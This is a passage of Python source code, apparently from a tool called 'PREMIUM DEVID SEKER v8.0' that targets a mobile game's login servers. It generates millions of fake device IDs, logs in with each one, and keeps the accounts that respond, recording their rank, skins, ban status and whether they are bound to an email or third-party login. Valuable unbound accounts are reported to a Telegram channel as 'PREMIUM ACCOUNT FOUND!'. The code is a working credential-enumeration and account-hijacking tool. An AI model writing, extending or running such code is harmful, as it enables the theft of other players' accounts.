    return f"and_{u5.replace('-', '')}_{random_base36(16)}"

# ══════════════════════════════════════════════════════════════════
#  FORMAT REGISTRY WITH WEIGHTS
# ══════════════════════════════════════════════════════════════════

FORMAT_REGISTRY = {
    "F1_CLASSIC": {
        "func": format_1_classic,
        "weight": 25,
        "description": "Classic OEM+UUID (Highest hit)",
        "prefix": "and_"
    },
    "F2_EXTENDED_B36": {
        "func": format_2_extended_b36,
        "weight": 20,
        "description": "Extended Base36 suffix",
        "prefix": "and_"
    },
    "F3_ANDROID_STYLE": {
        "func": format_3_android_style,
        "weight": 15,
        "description": "Clean Android ID style",
        "prefix": "and_"
    },
    "F4_GAID": {
        "func": format_4_gaid,
        "weight": 12,
        "description": "Google Advertising ID",
        "prefix": "and_"
    },
    "F5_IOS_SIMPLE": {
        "func": format_5_ios_simple,
        "weight": 8,
        "description": "iOS identifierForVendor",
        "prefix": "ios_"
    },
    "F6_IOS_TIMESTAMP": {
        "func": format_6_ios_timestamp,
        "weight": 5,
        "description": "iOS + microsecond timestamp",
        "prefix": "ios_"
    },
    "F7_COMPOSITE": {
        "func": format_7_composite,
        "weight": 10,
        "description": "Full composite (Most realistic)",
        "prefix": "and_"
    },
    "F8_UUID5": {
        "func": format_8_uuid5_style,
        "weight": 5,
        "description": "UUID5 deterministic style",
        "prefix": "and_"
    },
}

# Build weighted format pool
def _build_weighted_pool(registry: dict) -> List[Callable]:
    """Build a weighted list of format functions"""
    pool = []
    for key, info in registry.items():
        pool.extend([info["func"]] * info["weight"])
    return pool

WEIGHTED_FORMAT_POOL = _build_weighted_pool(FORMAT_REGISTRY)

# ── Format Statistics Tracker ──
class FormatStats:
    """Track format generation statistics"""
    def __init__(self):
        self.counts = Counter()
        self.lock = threading.Lock()
    
    def track(self, format_name: str):
        with self.lock:
            self.counts[format_name] += 1
    
    def get_stats(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.counts)
    
    def reset(self):
        with self.lock:
            self.counts.clear()

FORMAT_STATS = FormatStats()

# ══════════════════════════════════════════════════════════════════
#  MAIN GENERATION FUNCTIONS
# ══════════════════════════════════════════════════════════════════

def generate_oem_d() -> str:
    """
    OEM D — 8 Real Working Formats (Weighted Random)
    
    Distribution:
    - F1_CLASSIC: 25% (Highest hit)
    - F2_EXTENDED_B36: 20%
    - F3_ANDROID_STYLE: 15%
    - F4_GAID: 12%
    - F7_COMPOSITE: 10%
    - F5_IOS_SIMPLE: 8%
    - F6_IOS_TIMESTAMP: 5%
    - F8_UUID5: 5%
    """
    format_func = random.choice(WEIGHTED_FORMAT_POOL)
    device_id = format_func()
    
    # Track which format was used
    for name, info in FORMAT_REGISTRY.items():
        if info["func"] == format_func:
            FORMAT_STATS.track(name)
            break
    
    return device_id

def generate_verified_device() -> str:
    """Generate based on current OEM mode with validation"""
    mode = OEM_MODE
    
    if mode == "D":
        device = generate_oem_d()
    elif mode == "MIX_ABCD":
        r = random.random()
        if r < 0.30:
            device = generate_oem_d()
        elif r < 0.60:
            device = f"and_{OEM_A}{random_hex(16)}-{uuid4_str()}"
        elif r < 0.80:
            device = f"and_{random.choice(OEM_B_POOL)}{random_hex(16)}-{uuid4_str()}"
        else:
            device = f"and_{random.choice(OEM_C_POOL)}{random_hex(16)}-{uuid4_str()}"
    else:
        oem = get_oem()
        device = f"and_{oem}{random_hex(16)}-{uuid4_str()}"
    
    # Validate
    is_valid, reason = validate_device_id(device)
    if not is_valid:
        # Fallback to classic format
        return f"and_{get_oem()}{random_hex(16)}-{uuid4_str()}"
    
    return device

def generate_worker_verified(count: int, queue: Queue):
    """Worker thread for parallel generation"""
    for _ in range(count):
        queue.put(generate_verified_device() + "\n")

def writer_thread(queue: Queue, output_file: str):
    """Optimized batch writer"""
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
        while True:
            item = queue.get()
            if item is None: break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8*1024*1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))

def run_generator(size_mb: float, threads: int = 16):
    """Run device ID generator with statistics"""
    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE * 1.02)
    output_file = FILES["generated_devices"]
    if os.path.exists(output_file): os.remove(output_file)

    FORMAT_STATS.reset()

    queue = Queue(maxsize=100000)
    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
    writer.start()

    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    chunk_size = 50000
    lines_left = target_lines

    while lines_left > 0:
        take = min(chunk_size, lines_left)
        tasks.append(executor.submit(generate_worker_verified, take, queue))
        lines_left -= take

    for future in tasks:
        future.result()

    queue.put(None)
    writer.join()
    executor.shutdown()

    mode_names = {
        "A": f"OEM A ({OEM_A[:16]}...)",
        "B": f"OEM B (Random {len(OEM_B_POOL)})",
        "C": f"OEM C (Auto {len(OEM_C_POOL)})",
        "D": "⭐ OEM D (REAL — 8 formats)",
        "MIX": "MIX (90% A + 10% B)",
        "MIX_ABC": "MIX_ABC (70/15/15)",
        "MIX_ABCD": "MIX_ABCD (30/30/20/20)",
    }
    
    print(f"\n{Fore.GREEN}✓ Generated {target_lines:,} devices{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  Mode: {mode_names.get(OEM_MODE, OEM_MODE)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  File: {output_file}{Style.RESET_ALL}")
    
    # Show format distribution
    if OEM_MODE == "D":
        print(f"\n{Fore.YELLOW}Format Distribution:{Style.RESET_ALL}")
        stats = FORMAT_STATS.get_stats()
        for name, count in sorted(stats.items(), key=lambda x: -x[1]):
            pct = (count / max(sum(stats.values()), 1)) * 100
            bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
            print(f"  {name:<18} {bar} {count:>8,} ({pct:5.1f}%)")

# ────────────────────────────────────────────────────────────────
# 9. HIT COUNTERS + SAVE ENGINE
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'highrank': 0, 'v2l_active': 0, 'v2l_inactive': 0,
    'akun_tua': 0, 'hero_banyak': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()
save_lock = threading.Lock()

HIT_LIST: List[Dict] = []
HIT_LIST_LOCK = threading.Lock()

def get_rank_file(rank_category: str) -> str:
    rank_files = {
        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite": os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"], "elite_hits.txt"),
        "master": os.path.join(OUTPUT_DIR, FOLDERS["rank_master"], "master_hits.txt"),
        "gm": os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"], "grandmaster_hits.txt"),
        "epic": os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"], "epic_hits.txt"),
        "legend": os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"], "legend_hits.txt"),
        "mythic": os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"], "mythic_hits.txt"),
    }
    return rank_files.get(rank_category)

def is_already_saved(device_id: str, filepath: str) -> bool:
    if not os.path.exists(filepath): return False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return device_id in f.read()
    except: return False

def should_send_to_telegram(rank_category: str, skin_count: int, highest_rank: str) -> bool:
    if rank_category in ["legend", "mythic"]: return True
    if skin_count >= 100: return True
    if "Glory" in highest_rank or "Immortal" in highest_rank:
        if get_stars_from_rank(highest_rank) >= 50:
            return True
    return False

def format_account_card(device: str, acc: int, zone: int, pd: dict) -> str:
    return "\n".join([
        "═" * 60,
        f"Device ID    : {device}",
        f"Account      : {acc} ({zone})",
        f"Nickname     : {pd.get('nickname', 'N/A')} (Lv.{pd.get('level', 'N/A')})",
        f"Rank         : {pd.get('current_rank', 'Unranked')}",
        f"Max Rank     : {pd.get('highest_rank', 'N/A')}",
        f"Heroes       : {pd.get('hero_count', 0)}",
        f"Skins        : {pd.get('skin_count', 0)}",
        f"V2L          : {pd.get('v2l_status', 'N/A')}",
        f"Mt           : {'clear' if pd.get('mt_status','clear')=='clear' else 'bound'}",
        f"Mt mail      : {'clear' if pd.get('mt_mail_status','clear')=='clear' else 'bound'}",
        f"3rd          : {'clear' if pd.get('third_party_status','clear')=='clear' else 'bound'}",
        f"Offline      : {pd.get('offline_days', 'N/A')}",
        f"Last Online  : {pd.get('last_online', 'N/A')}",
        f"Created      : {pd.get('created_at', 'N/A')}",
        "═" * 60,
    ])

def save_account(account_info: dict, player_data: dict):
    global HIT_COUNTERS

    device = account_info.get('Device id', '')
    acc, zone = account_info.get('role_id', '?'), account_info.get('zone_id', '?')

    ban_stat = player_data.get('ban_status', 'NORMAL')
    if 'ban' in str(ban_stat).lower():
        with save_lock:
            with open(os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt"), "a", encoding='utf-8') as f:
                f.write(f"{device} | {acc}:{zone} | {ban_stat}\n")
        with COUNTER_LOCK:
            HIT_COUNTERS['banned'] += 1
        return

    nick = player_data.get('nickname', 'N/A')
    if str(nick).lower() in ("unknown", "guest", ""):
        return

    level = player_data.get('level', 'N/A')
    skin = player_data.get('skin_count', 0)
    hero = player_data.get('hero_count', 0)
    v2l = player_data.get('v2l_status', 'N/A')
    v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
               "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"

    cur_rank = player_data.get('current_rank', 'Unranked')
    rank_category = get_rank_category(cur_rank)
    rank_folder = get_rank_file(rank_category)
    highest_rank = player_data.get('highest_rank', 'Unranked')

    card_text = format_account_card(device, acc, zone, player_data)

    with save_lock:
        if not is_already_saved(device, FILES["all_hits_detail"]):
            with open(FILES["all_hits_detail"], "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if not is_already_saved(device, FILES["raw_devices_detail"]):
            with open(FILES["raw_devices_detail"], "a", encoding='utf-8') as f:
                f.write(f"{device}\n")

        if rank_folder and not is_already_saved(device, rank_folder):
            with open(rank_folder, "a", encoding='utf-8') as f:
                f.write(card_text + "\n")

        if v2l_text == "ACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_inactive"], "v2l_inactive.txt")
            if not is_already_saved(device, v2l_file):
                with open(v2l_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1

        if skin >= 200:
            sultan_file = os.path.join(OUTPUT_DIR, FOLDERS["sultan"], "sultan.txt")
            if not is_already_saved(device, sultan_file):
                with open(sultan_file, "a", encoding='utf-8') as f:
                    f.write(card_text + "\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

    with HIT_LIST_LOCK:
        HIT_LIST.append({
            'device': device,
            'acc': acc,
            'zone': zone,
            'nickname': nick,
            'level': level,
            'skin': skin,
            'hero': hero,
            'rank': cur_rank,
            'max_rank': highest_rank,
            'v2l': v2l_text,
            'mt': 'clear' if player_data.get('mt_status','clear')=='clear' else 'bound',
            'mt_mail': 'clear' if player_data.get('mt_mail_status','clear')=='clear' else 'bound',
            '3rd': 'clear' if player_data.get('third_party_status','clear')=='clear' else 'bound',
            'offline': player_data.get('offline_days', 'N/A'),
            'last_online': player_data.get('last_online', 'N/A'),
            'created': player_data.get('created_at', 'N/A'),
            'time': datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S'),
        })

    if should_send_to_telegram(rank_category, skin, highest_rank):
        mt = "clear" if player_data.get('mt_status','clear')=='clear' else "bound"
        mt_mail = "clear" if player_data.get('mt_mail_status','clear')=='clear' else "bound"
        third = "clear" if player_data.get('third_party_status','clear')=='clear' else "bound"
        tg_message = (
            f"🔥 <b>PREMIUM ACCOUNT FOUND!</b>\n"
            f"─────────────────────────\n"
            f"📱 Device    : <code>{device}</code>\n"
            f"🆔 Account   : <b>{acc}</b> ({zone})\n"
            f"👤 Nickname  : <b>{nick}</b> (Lv.{level})\n"
            f"🏆 Rank      : {cur_rank}\n"
            f"⭐ Max Rank  : {highest_rank}\n"
            f"🦸 Heroes    : {hero}  |  🎨 Skins : {skin}\n"
            f"🔐 V2L       : {'🟢' if v2l_text == 'ACTIVE' else '🔓'} {v2l_text}\n"
            f"📧 Mt        : {mt}\n"
            f"📮 Mt mail   : {mt_mail}\n"
            f"🔗 3rd       : {third}\n"
            f"⏰ Offline   : {player_data.get('offline_days', 'N/A')}\n"
            f"═════════════════════════════════\n"
            f"✨ <b>PREMIUM DEVID SEKER</b>\n"
            f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
        )
        threading.Thread(target=send_telegram_once, args=(device, tg_message,), daemon=True).start()

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

# ────────────────────────────────────────────────────────────────
# 10. DETAIL CHECK (LIVE)
# ────────────────────────────────────────────────────────────────

LIVE_STATS = {
    'checked': 0, 'hits': 0, 'banned': 0, 'invalid': 0,
    'start_time': 0, 'lock': threading.Lock()
}

def process_detail(device_id: str, account_id: int, zone_id: int) -> bool:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                with LIVE_STATS['lock']:
                    LIVE_STATS['invalid'] += 1
                return False
            if not conn.get_game_server():
                return False
            if not conn.connect_to_game_server():
                return False

            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat = conn.check_ban_status()
            if 'ban' in ban_stat.lower():
                with LIVE_STATS['lock']:
                    LIVE_STATS['banned'] += 1
                return False

            v2l = get_v2l_status(conn, account_id, zone_id)
            moonton = get_moonton_status(conn, account_id, zone_id)
            result = conn.lookup_player(account_id)
            role_info = conn.get_role_info(account_id, zone_id)

            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and result[0] and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result

            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}

            nick = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{account_id}"
            if str(nick).lower() in ("unknown", "guest", ""):
                return False

            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            skin_cnt = skin_info.get(10) if skin_info.get(10) is not None else pd.get(83, 0)
            hero_cnt = skin_info.get(9) if skin_info.get(9) is not None else role_info.get(9, 0)
            cur_rk_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rk_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0

            last_online_ts = (
                pd.get(21) or pd.get(22) or pd.get(23) or
                skin_info.get(21) or skin_info.get(22) or
                role_info.get(21) or role_info.get(22) or 0
            )
            offline_info = compute_offline_info(last_online_ts)

            created_raw = pd.get(42) or conn.creation_ts
            created_at = "N/A"
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except: pass

            player_data = {
                'nickname': nick,
                'level': level,
                'skin_count': skin_cnt,
                'hero_count': hero_cnt,
                'current_rank': map_rank(cur_rk_val),
                'highest_rank': map_rank(max_rk_val) if max_rk_val else map_rank(cur_rk_val),
                'ban_status': ban_stat,
                'v2l_status': v2l,
                'mt_status': moonton.get('mt', 'clear'),
                'mt_mail_status': moonton.get('mt_mail', 'clear'),
                'third_party_status': moonton.get('third_party', 'clear'),
                'created_at': created_at,
                'offline_days': offline_info['offline_days'],
                'last_online': offline_info['last_online'],
            }

            with LIVE_STATS['lock']:
                LIVE_STATS['hits'] += 1

            save_account(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                player_data
            )
            return True
    except Exception:
        return False

# ────────────────────────────────────────────────────────────────
# 11. BULK CHECK — LIVE
# ────────────────────────────────────────────────────────────────

def run_bulk_detail():
    global LIVE_STATS
    print_header("🔥 PREMIUM BULK DETAIL CHECK (LIVE)")
    print(f"{Fore.CYAN}Live device checking{Style.RESET_ALL}\n")

    import glob
    txt_files = glob.glob(os.path.join(OUTPUT_DIR, "**", "*.txt"), recursive=True)

    if not txt_files:
        print(f"{Fore.RED}No .txt files found!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}Select input file:{Style.RESET_ALL}")
    for i, f in enumerate(txt_files[:20], 1):
        rel = os.path.relpath(f, ".")
        print(f"  {Fore.YELLOW}[{i}]{Style.RESET_ALL} {rel}")
    print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")

    choice = input(f"{Fore.CYAN}Choice (0-{len(txt_files)}): {Style.RESET_ALL}").strip()
    if choice == '0': return

    try:
        idx = int(choice) - 1
        if 0 <= idx < len(txt_files):
            input_file = txt_files[idx]
        else:
            return
    except:
        return

    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        devices = [l.strip() for l in f if l.strip()]

    if not devices:
        print(f"{Fore.RED}No device IDs found.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}Loaded {len(devices):,} devices{Style.RESET_ALL}")

    threads = input(f"{Fore.CYAN}Thread count (default 20, safe): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 20

    LIVE_STATS = {
        'checked': 0, 'hits': 0, 'banned': 0, 'invalid': 0,
        'start_time': time.time(), 'lock': threading.Lock()
    }

    with HIT_LIST_LOCK:
        HIT_LIST.clear()

    print(f"\n{Fore.CYAN}Starting LIVE check...{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}{'─'*80}{Style.RESET_ALL}")

    def check_one(dev):
        with LIVE_STATS['lock']:
            LIVE_STATS['checked'] += 1
            n = LIVE_STATS['checked']
            h = LIVE_STATS['hits']
            b = LIVE_STATS['banned']
            i = LIVE_STATS['invalid']
            elapsed = time.time() - LIVE_STATS['start_time']
            speed = n / elapsed if elapsed > 0 else 0

        acc, zone, stat = GameLogin(dev).run()

        if acc and zone:
            sys.stdout.write(
                f"\r{Fore.GREEN}✓{Style.RESET_ALL} "
                f"[{n}/{len(devices)}] "
                f"{Fore.YELLOW}{dev[:40]}...{Style.RESET_ALL} → "
                f"{Fore.CYAN}acc={acc} zone={zone}{Style.RESET_ALL} | "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{i} ({speed:.1f}/s){Style.RESET_ALL}"
            )
            sys.stdout.flush()
            print()
            process_detail(dev, acc, zone)
        else:
            with LIVE_STATS['lock']:
                LIVE_STATS['invalid'] += 1
                i = LIVE_STATS['invalid']

            sys.stdout.write(
                f"\r{Fore.RED}✗{Style.RESET_ALL} "
                f"[{n}/{len(devices)}] "
                f"{Fore.LIGHTBLACK_EX}{dev[:40]}...{Style.RESET_ALL} → "
                f"{Fore.RED}INVALID ({stat[:20]}){Style.RESET_ALL} | "
                f"{Fore.GREEN}H:{h}{Style.RESET_ALL} "
                f"{Fore.RED}B:{b}{Style.RESET_ALL} "
                f"{Fore.LIGHTBLACK_EX}I:{i} ({speed:.1f}/s){Style.RESET_ALL}"
            )
            sys.stdout.flush()
            print()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(check_one, devices))

    duration = time.time() - LIVE_STATS['start_time']

    print(f"\n{Fore.CYAN}{'─'*80}{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}✓ Done!{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total: {LIVE_STATS['checked']:,}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Hits: {LIVE_STATS['hits']:,}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Banned: {LIVE_STATS['banned']:,}{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTBLACK_EX}Invalid: {LIVE_STATS['invalid']:,}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Time: {duration:.1f}s | Speed: {LIVE_STATS['checked']/max(duration,1):.1f}/s{Style.RESET_ALL}")

    with HIT_LIST_LOCK:
        total_hits = len(HIT_LIST)

    if total_hits > 0:
        print(f"\n{Fore.GREEN}✓ {total_hits} hits collected for TG report{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Use Menu [8] to send TXT report{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 12. TG HIT REPORT
# ────────────────────────────────────────────────────────────────

def send_hits_report_to_tg():
    print_header("📄 SEND HITS REPORT TO TELEGRAM")

    with HIT_LIST_LOCK:
        hits = list(HIT_LIST)

    if not hits:
        print(f"{Fore.RED}✗ No hits collected!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Run Bulk Check (Menu 2) first.{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}Collected Hits: {len(hits)}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}Preview (first 5):{Style.RESET_ALL}")
    for i, h in enumerate(hits[:5], 1):
        print(f"  {i}. {h['device'][:40]}... | {h['acc']} | {h['rank']}")
    if len(hits) > 5:
        print(f"  {Fore.LIGHTBLACK_EX}... +{len(hits)-5} more{Style.RESET_ALL}")

    print()
    confirm = input(f"{Fore.YELLOW}Send to Telegram? (y/n): {Style.RESET_ALL}").strip().lower()
    if confirm != 'y':
        return

    report_path = os.path.join(
        OUTPUT_DIR, FOLDERS["reports"],
        f"hits_report_{datetime.now(TZ_WIB).strftime('%Y%m%d_%H%M%S')}.txt"
    )

    lines = [
        "=" * 80,
        "PREMIUM DEVID SEKER — HITS REPORT",
        f"Generated: {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}",
        f"Total Hits: {len(hits)}",
        f"Created by: {ADMIN_USERNAME_DISPLAY}",
        "=" * 80,
        ""
    ]

    for i, h in enumerate(hits, 1):
        lines += [
            f"───── HIT #{i} ─────",
            f"Device ID    : {h['device']}",
            f"Role ID      : {h['acc']} ({h['zone']})",
            f"Nickname     : {h['nickname']} (Lv.{h['level']})",
            f"Rank         : {h['rank']}",
            f"Max Rank     : {h['max_rank']}",
            f"Skins        : {h['skin']}",
            f"Heroes       : {h['hero']}",
            f"V2L          : {h['v2l']}",
            f"Mt           : {h['mt']}",
            f"Mt mail      : {h['mt_mail']}",
            f"3rd          : {h['3rd']}",
            f"Offline      : {h['offline']}",
            f"Last Online  : {h['last_online']}",
            f"Created      : {h['created']}",
            f"Hit Time     : {h['time']}",
            ""
        ]

    with open(report_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines))

    print(f"\n{Fore.GREEN}✓ Report built: {report_path}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Sending to Telegram...{Style.RESET_ALL}")

    caption = (
        f"📄 <b>HITS REPORT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Total Hits: <b>{len(hits)}</b>\n"
        f"⏰ {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n"
        f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
    )

    success = send_telegram_document(report_path, caption)

    if success:
        print(f"{Fore.GREEN}✓ Report sent!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed to send{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 13. STATS + UTILS
# ────────────────────────────────────────────────────────────────

def show_stats():
    print_header("📊 STATISTICS")
    with COUNTER_LOCK:
        print(f"{Fore.CYAN}Rank Distribution:{Style.RESET_ALL}")
        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
            c = HIT_COUNTERS.get(rank, 0)
            color = Fore.MAGENTA if rank == 'mythic' else Fore.CYAN if rank == 'legend' else Fore.WHITE
            print(f"  {rank.capitalize():<12}: {color}{c:,}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}V2L:{Style.RESET_ALL}")
        print(f"  Active    : {Fore.GREEN}{HIT_COUNTERS.get('v2l_active', 0):,}{Style.RESET_ALL}")
        print(f"  Inactive  : {Fore.YELLOW}{HIT_COUNTERS.get('v2l_inactive', 0):,}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}Special:{Style.RESET_ALL}")
        print(f"  Sultan    : {Fore.YELLOW}{HIT_COUNTERS.get('sultan', 0):,}{Style.RESET_ALL}")
        print(f"  Banned    : {Fore.RED}{HIT_COUNTERS.get('banned', 0):,}{Style.RESET_ALL}")

    with HIT_LIST_LOCK:
        print(f"\n{Fore.CYAN}Session Hits: {Fore.GREEN}{len(HIT_LIST):,}{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def run_cleanup():
    import shutil
    print_header("🗑️ CLEAN OUTPUT FILES")
    confirm = input(f"{Fore.RED}Are you sure? (y/n): {Style.RESET_ALL}").strip().lower()
    if confirm == 'y':
        shutil.rmtree(OUTPUT_DIR)
        ensure_dirs()
        print(f"{Fore.GREEN}✓ Output cleaned!{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def test_telegram():
    print_header("📨 TEST TELEGRAM")
    success = send_telegram(
        f"🔔 <b>PREMIUM DEVID SEKER v8.0</b>\n"
        f"✅ Telegram connected!\n\n"
        f"👑 <b>{ADMIN_USERNAME_DISPLAY}</b>"
    )
    if success:
        print(f"{Fore.GREEN}✓ Test sent!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed!{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 14. GENERATOR MENU
# ────────────────────────────────────────────────────────────────

def run_generator_menu():
    global OEM_MODE

    print_header("🔨 GENERATE DEVICE IDS")

    print(f"{Fore.CYAN}Select OEM Mode:{Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} {Fore.GREEN}OEM A{Style.RESET_ALL} — Verified (1 OEM)")
    print(f"{Fore.LIGHTBLACK_EX}     {OEM_A}{Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} {Fore.CYAN}OEM B{Style.RESET_ALL} — Device Pool ({len(OEM_B_POOL)} OEMs)\n")

    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} {Fore.MAGENTA}OEM C{Style.RESET_ALL} — Auto Generate ({len(OEM_C_POOL)} OEMs)\n")

    print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} {Fore.YELLOW}⭐ OEM D{Style.RESET_ALL} — REAL WORKING (8 Formats v8.0)")
    print(f"{Fore.LIGHTBLACK_EX}     Format 1: Classic OEM+UUID          (25%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 2: Extended Base36           (20%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 3: Android ID Style          (15%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 4: Google Advertising ID     (12%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 5: iOS Simple                ( 8%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 6: iOS + Timestamp           ( 5%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 7: Full Composite            (10%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLACK_EX}     Format 8: UUID5 Deterministic       ( 5%){Style.RESET_ALL}\n")

    print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} MIX     — 90% A + 10% B")
    print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} MIX_ABC — 70/15/15")
    print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} ⭐ MIX_ABCD — 30/30/20/20\n")
    print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} 🔙 Back\n")

    choice = input(f"{Fore.CYAN}Choose mode (0-7): {Style.RESET_ALL}").strip()

    mode_map = {
        '1': "A", '2': "B", '3': "C", '4': "D",
        '5': "MIX", '6': "MIX_ABC", '7': "MIX_ABCD",
    }

    if choice == '0' or choice not in mode_map:
        return

    OEM_MODE = mode_map[choice]

    mode_names = {
        "A": "OEM A (Verified)",
        "B": f"OEM B (Pool of {len(OEM_B_POOL)})",
        "C": f"OEM C (Auto {len(OEM_C_POOL)})",
        "D": "⭐ OEM D (REAL — 8 Formats v8.0)",
        "MIX": "MIX (90% A + 10% B)",
        "MIX_ABC": "MIX_ABC (70/15/15)",
        "MIX_ABCD": "MIX_ABCD (30/30/20/20)",
    }

    print(f"\n{Fore.GREEN}✓ Selected: {mode_names[OEM_MODE]}{Style.RESET_ALL}\n")

    if OEM_MODE == "D":
        print(f"{Fore.YELLOW}Sample OEM D devices (all 8 formats):{Style.RESET_ALL}")
        samples = [
